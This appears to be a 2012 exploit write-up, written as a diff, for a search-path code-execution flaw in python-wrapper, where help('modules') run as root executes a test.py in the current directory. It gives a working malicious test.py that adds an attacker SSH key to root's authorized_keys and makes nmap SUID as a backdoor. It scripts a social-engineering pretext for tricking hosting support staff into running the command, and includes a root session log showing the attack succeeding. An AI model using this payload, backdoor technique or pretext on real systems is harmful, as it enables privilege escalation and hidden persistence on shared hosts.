@@ -1,0 +1,174 @@
+# python-wrapper untrusted search path/code execution vulnerability
+#
+# Python-wrapper executes any test.py script within the current working directory, when supplied with help('modules').
+# A non-priviledged user may gain code execution by tricking root to help('modules') or help() and then modules from within python-wrapper 
+# while within a non-priviledged user's work directory. 
+#
+# The evil file MUST be titled test.py! os.system("evilcommand") will result in python-wrapper executing said command, and then continuing normally
+# with no signs of compromise if you redirect command output. os.system("/bin/echo ssh-rsa yourkey yourkeycomment >> /root/.ssh/authorized_keys") does not 
+# work, however os.system("/bin/echo $(echo ssh-rsa yourkey yourkeycomment >> /root/.ssh/authorized_keys)") does. 
+#
+#
+# Additionally, nmap makes a great backdoor from a non-priviledged user account because it's something that looks like you might actually
+# want SETUID under certain circumstances, but not really(and it will bitch if invoked). In nmap 5.31DC1 the most useful switch(--interactive) was removed
+# which previously allowed you to bang out a shell(!/bin/csh, but not bash). Thank you David/Juan Carlos Castro for breaking one of my favorites.
+# NOW however there is the nmap scripting engine to exploit. As usual, the input-output commands will behave like any exploitable SETUID program 
+# with input-output commands.
+#
+#
+# A practical example of how this vulnerability could be useful is if you wish to attack a shared webhosting enviornment.
+# After convincing root(support) to cd in to your directory, perhaps by uploading a broken "distraction.py" and getting him to troubleshoot it,
+# you could pose the question: "Hey, what python modules do you guys have installed?" "I'm not quite sure how to list that..."
+# "You can list the modules installed by entering python-wrapper, and typing help('modules')" "Oh!" *silent test.py execution by root* 
+# "There's a lot of them... would you like them as an email attachment?" "Yeah, thanks. I think I'll look at that and try troubleshooting this more myself".
+#
+#
+# - ShadowHatesYou (Shadow@SquatThis.net)
+# 6/30/12
+
+root@tourian:/home/shadow/python# ls -hl test.py
+-rw-r--r-- 1 shadow shadow 137 Jun 30 13:06 test.py
+root@tourian:/home/shadow/python# cat test.py
+#!/bin/python
+import os
+os.system('/bin/echo $(echo "ssh-rss pwned byshadow" >> /root/.ssh/authorized_keys); chmod 4755 /usr/bin/nmap')
+
+root@tourian:/home/shadow/python# ls -hl /usr/bin/nmap
+-rwxr-xr-x 1 root root 1.9M Jun 30 13:06 /usr/bin/nmap
+root@tourian:/home/shadow/python# ls -hl /root/.ssh/authorized_keys
+ls: cannot access /root/.ssh/authorized_keys: No such file or directory
+root@tourian:/home/shadow/python# python-wrapper
+Python 2.7.3 (default, May  4 2012, 00:13:26)
+[GCC 4.6.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> help('modules')
+
+Please wait a moment while I gather a list of all available modules...
+
+
+ArgImagePlugin      _bisect             email               pprint
+BaseHTTPServer      _codecs             encodings           pptransport
+Bastion             _codecs_cn          errno               ppworker
+BdfFontFile         _codecs_hk          exceptions          profile
+BeautifulSoup       _codecs_iso2022     fcntl               pstats
+BeautifulSoupTests  _codecs_jp          filecmp             pty
+BitTornado          _codecs_kr          fileinput           pwd
+BmpImagePlugin      _codecs_tw          fnmatch             py_compile
+BufrStubImagePlugin _collections        formatter           pyclbr
+CDROM               _cracklib           fpformat            pydoc
+CGIHTTPServer       _csv                fractions           pydoc_data
+ConfigParser        _ctypes             ftplib              pyexpat
+ContainerIO         _ctypes_test        functools           pyrit_cli
+Cookie              _curses             future_builtins     pyximport
+Crypto              _curses_panel       gamin               quopri
+CurImagePlugin      _elementtree        gc                  random
+Cython              _emerge             gdbm                re
+DLFCN               _functools          genericpath         readline
+DcxImagePlugin      _gamin              gentoolkit          repoman
+DocXMLRPCServer     _gv                 getopt              repr
+EpsImagePlugin      _hashlib            getpass             resource
+ExifTags            _heapq              gettext             rexec
+FitsStubImagePlugin _hotshot            git_remote_helpers  rfc822
+FliImagePlugin      _imaging            glob                rlcompleter
+FontFile            _imagingft          grp                 robotparser
+FpxImagePlugin      _imagingmath        gv                  rrdtool
+GbrImagePlugin      _io                 gzip                runpy
+GdImageFile         _json               hashlib             scapy
+GifImagePlugin      _lcms               heapq               sched
+GimpGradientFile    _ldns               hmac                scipy
+GimpPaletteFile     _locale             hotshot             select
+GribStubImagePlugin _lsprof             htmlentitydefs      sets
+HTMLParser          _md5                htmllib             setuptools
+Hdf5StubImagePlugin _multibytecodec     httplib             sgmllib
+IN                  _multiprocessing    ihooks              sha
+IcnsImagePlugin     _pyio               imaplib             shelve
+IcoImagePlugin      _random             imghdr              shlex
+ImImagePlugin       _sha                imp                 shutil
+Image               _sha256             importlib           signal
+ImageChops          _sha512             imputil             site
+ImageCms            _socket             inspect             smtpd
+ImageColor          _sre                io                  smtplib
+ImageDraw           _ssl                itertools           sndhdr
+ImageDraw2          _strptime           java_config_2       socket
+ImageEnhance        _struct             javatoolkit         spwd
+ImageFile           _symtable           json                sre
+ImageFileIO         _testcapi           keyword             sre_compile
+ImageFilter         _threading_local    lcms                sre_constants
+ImageFont           _unbound            ldns                sre_parse
+ImageGL             _warnings           ldnsx               ssl
+ImageGrab           _weakref            lib2to3             stat
+ImageMath           _weakrefset         libsvn              statvfs
+ImageMode           _xmlplus            libxml2             string
+ImageOps            abc                 libxml2mod          stringold
+ImagePalette        aifc                libxslt             stringprep
+ImagePath           antigravity         libxsltmod          strop
+ImageQt             anydbm              linecache           struct
+ImageSequence       argparse            linuxaudiodev       subprocess
+ImageShow           array               locale              sunau
+ImageStat           ast                 logging             sunaudio
+ImageTk             asynchat            lxml                svn
+ImageTransform      asyncore            macpath             symbol
+ImageWin            atexit              macurl2path         symtable
+ImtImagePlugin      audiodev            magic               sys
+IptcImagePlugin     audioop             mailbox             sysconfig
+JpegImagePlugin     base64              mailcap             syslog
+McIdasImagePlugin   bdb                 markupbase          tabnanny
+MicImagePlugin      binascii            marshal             tarfile
+MimeWriter          binhex              math                telnetlib
+MpegImagePlugin     bisect              md5                 tempfile
+MspImagePlugin      bs4                 mhlib               termios
+OleFileIO           bz2                 mimetools           test
+OpenIPMI            cPickle             mimetypes           textwrap
+PAM                 cProfile            mimify              this
+PIL                 cStringIO           mirrorselect        thread
+PSDraw              calendar            mmap                threading
+PaletteFile         cgi                 modulefinder        time
+PalmImagePlugin     cgitb               multifile           timeit
+PcdImagePlugin      chunk               multiprocessing     toaiff
+PcfFontFile         cmath               mutex               token
+PcxImagePlugin      cmd                 netrc               tokenize
+PdfImagePlugin      code                netsnmp             trace
+PixarImagePlugin    codecs              new                 traceback
+PngImagePlugin      codeop              nis                 tty
+PpmImagePlugin      collections         nntplib             types
+PsdImagePlugin      colorsys            ntpath              unbound
+Queue               commands            nturl2path          unboundmodule
+SgiImagePlugin      compileall          numbers             unicodedata
+SimpleHTTPServer    compiler            numpy               unittest
+SimpleXMLRPCServer  contextlib          opcode              urllib
+SocketServer        cookielib           operator            urllib2
+SpiderImagePlugin   copy                optparse            urlparse
+StringIO            copy_reg            os                  user
+SunImagePlugin      cpyrit              os2emxpath          uu
+TYPES               cracklib            ossaudiodev         uuid
+TarIO               crypt               paramiko            warnings
+TiffImagePlugin     ctypes              pdb                 weakref
+TiffTags            curses              pickle              webbrowser
+UserDict            cython              pickletools         whichdb
+UserList            datetime            pipes               wsgiref
+UserString          dbm                 pkg_resources       xattr
+WalImageFile        decimal             pkgutil             xcbgen
+WmfImagePlugin      difflib             platform            xdelta3main
+XVThumbImagePlugin  dircache            plistlib            xdrlib
+XbmImagePlugin      dis                 popen2              xen
+XpmImagePlugin      distutils           poplib              xml
+_LWPCookieJar       dnet                portage             xmllib
+_MozillaCookieJar   doctest             posix               xmlrpclib
+_OpenIPMI           drv_libxml2         posixfile           xxsubtype
+__builtin__         dumbdbm             posixpath           yasm
+__future__          dummy_thread        pp                  zipfile
+_abcoll             dummy_threading     ppauto              zipimport
+_ast                easy_install        ppcommon            zlib
+
+Enter any module name to get more help.  Or, type "modules spam" to search
+for modules whose descriptions contain the word "spam".
+
+>>> quit()
+root@tourian:/home/shadow/python# ls -hl /usr/bin/nmap
+-rwsr-xr-x 1 root root 1.9M Jun 30 13:06 /usr/bin/nmap
+root@tourian:/home/shadow/python# cat /root/.ssh/authorized_keys
+ssh-rss pwned byshadow
+
+
+# Wish I had DuoSecurity!
+# See you at Defcon!
